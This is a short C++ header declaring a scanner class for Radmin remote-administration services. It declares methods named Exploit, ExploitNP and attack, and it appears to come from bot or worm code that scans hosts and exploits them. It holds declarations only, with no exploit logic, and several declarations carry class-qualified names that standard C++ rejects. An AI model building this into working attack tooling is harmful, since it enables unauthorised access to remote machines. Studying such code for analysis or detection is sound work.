#ifndef __RADMINSCANNER_H__
#define __RADMINSCANNER_H__

#include "cstring.h"
#include "scanner.h"

class CScannerRADMIN : public CScannerBase
{
public:
	CScannerRADMIN();
	virtual ~CScannerRADMIN() throw() { }
	virtual void StartScan(const CString &sHost);
	virtual bool TestHost(const CString &sHost) { return true; }

	bool Exploit(const CString &sHost);
    void CScannerRADMIN::DoCheckOpen(char *sHost);
    int CScannerRADMIN::AttemptConnect(int tm, int ScanPort, const char* sHost);
    int CScannerRADMIN::attack(char *sHost);
	bool ExploitNP(const CString &sHost);
};

#endif // __RADMINSCANNER_H__
